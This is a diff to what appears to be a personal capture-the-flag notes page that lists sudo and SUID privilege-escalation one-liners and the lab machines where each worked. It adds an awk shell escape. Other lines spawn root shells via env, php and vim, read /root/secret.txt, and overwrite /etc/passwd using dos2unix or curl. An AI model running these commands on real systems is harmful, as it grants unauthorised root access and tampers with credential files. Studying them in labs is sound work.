@@ -25,6 +25,7 @@ env /bin/sh -p                            # SUID env → root shell
 sudo dos2unix -f -n /tmp/passwd.new /etc/passwd  # overwrite passwd → blank root
 sudo php -r 'system("/bin/sh -i")'        # sudo php → shell
 sudo env /bin/bash                         # sudo env → root shell
+sudo awk 'BEGIN {system("/bin/sh")}'       # sudo awk → shell (as the -u target)
 sudo vim -c ':!/bin/bash'                  # sudo vim → shell
 sudo file -f /root/secret.txt             # file-read: each line echoed in the error output
 curl file:///tmp/passwd -o /etc/passwd    # SUID curl: read one file, write another AS ROOT
@@ -35,4 +36,4 @@ curl file:///tmp/passwd -o /etc/passwd    # SUID curl: read one file, write anot
 
 ## Seen in
 
-[[trust]], [[obsession]], [[simple-ctf]], [[vacaciones]], [[hedgehog]], [[borazuwara]], [[hannah-coffee]], [[duque]], [[walkingcms]], [[anonymous-pingu]], [[trailpack]], [[bruteshock]], [[littlepivoting]], [[madeyes-castle]], [[flynn]], [[dance-samba]], [[dark]] (curl `file://` + `-o`)
+[[trust]], [[obsession]], [[simple-ctf]], [[vacaciones]], [[hedgehog]], [[borazuwara]], [[hannah-coffee]], [[duque]], [[walkingcms]], [[anonymous-pingu]], [[trailpack]], [[bruteshock]], [[littlepivoting]], [[madeyes-castle]], [[flynn]], [[dance-samba]], [[dark]] (curl `file://` + `-o`), [[file]] (`awk` → julen, `env` → iker, then a pinned `python3 script.py` where the payload goes *inside* the script)
